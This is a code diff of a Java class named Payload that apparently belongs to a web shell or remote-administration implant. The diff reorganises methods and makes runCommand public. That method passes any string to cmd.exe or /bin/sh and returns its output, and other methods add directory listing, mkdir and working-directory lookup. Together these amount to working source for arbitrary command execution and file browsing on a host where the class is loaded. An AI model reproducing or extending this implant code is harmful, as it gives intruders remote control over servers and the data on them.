@@ -16,11 +16,11 @@ import java.util.regex.Pattern;
 
 public class Payload {
     // public static void main(String args[]) {
-    //     Payload payload = (new Payload());
-    //     Object result = payload.listFiles("./");
-    //     StringBuilder sb = new StringBuilder();
-    //     payload.jsonEncodeObject(sb, result);
-    //     System.out.println(sb.toString());
+    // Payload payload = (new Payload());
+    // Object result = payload.listFiles("./");
+    // StringBuilder sb = new StringBuilder();
+    // payload.jsonEncodeObject(sb, result);
+    // System.out.println(sb.toString());
     // }
 
     public boolean equals(Object obj) {
@@ -132,43 +132,6 @@ public class Payload {
         return result;
     }
 
-    private ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
-        Process p;
-        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
-        if (command == null || command.length() == 0) {
-            throw new IllegalArgumentException("Wrong command");
-        }
-        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-            p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", command });
-        } else {
-            p = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command });
-        }
-        ArrayList<String> result = new ArrayList<String>();
-        result.addAll(readStream(p.getInputStream(), osCharset));
-        result.addAll(readStream(p.getErrorStream(), osCharset));
-        return result;
-    }
-
-    public static ArrayList<Map<String, Object>> listFiles(String dirPath) {
-        ArrayList<Map<String, Object>> result = new ArrayList<>();
-        File dir = new File(dirPath);
-        if (dir.isDirectory()) {
-            for (File file : dir.listFiles()) {
-                String fileName = file.getName();
-                String fileType = getFileType(file);
-                long fileSize = file.length();
-                String filePermission = getFilePermission(file);
-                Map<String, Object> item = new HashMap<>();
-                item.put("name", fileName);
-                item.put("permission", filePermission);
-                item.put("filesize", fileSize);
-                item.put("entry_type", fileType);
-                result.add(item);
-            }
-        }
-        return result;
-    }
-
     private static String getFileType(File file) {
         String type = "";
         if (file.isFile()) {
@@ -192,6 +155,54 @@ public class Payload {
         } catch (Exception e) {
             return "---------";
         }
+    }
+
+    // actions:
+
+    public ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
+        Process p;
+        Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
+        if (command == null || command.length() == 0) {
+            throw new IllegalArgumentException("Wrong command");
+        }
+        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+            p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", command });
+        } else {
+            p = Runtime.getRuntime().exec(new String[] { "/bin/sh", "-c", command });
+        }
+        ArrayList<String> result = new ArrayList<String>();
+        result.addAll(readStream(p.getInputStream(), osCharset));
+        result.addAll(readStream(p.getErrorStream(), osCharset));
+        return result;
+    }
+
+    public String mkdir(String dir_path) {
+        (new File(dir_path)).mkdir();
+        return dir_path;
+    }
+
+    public String getPwd() {
+        return System.getProperty("user.dir");
+    }
+
+    public static ArrayList<Map<String, Object>> listFiles(String dirPath) {
+        ArrayList<Map<String, Object>> result = new ArrayList<>();
+        File dir = new File(dirPath);
+        if (dir.isDirectory()) {
+            for (File file : dir.listFiles()) {
+                String fileName = file.getName();
+                String fileType = getFileType(file);
+                long fileSize = file.length();
+                String filePermission = getFilePermission(file);
+                Map<String, Object> item = new HashMap<>();
+                item.put("name", fileName);
+                item.put("permission", filePermission);
+                item.put("filesize", fileSize);
+                item.put("entry_type", fileType);
+                result.add(item);
+            }
+        }
+        return result;
     }
 
     public HashMap<String, Object> ping() {
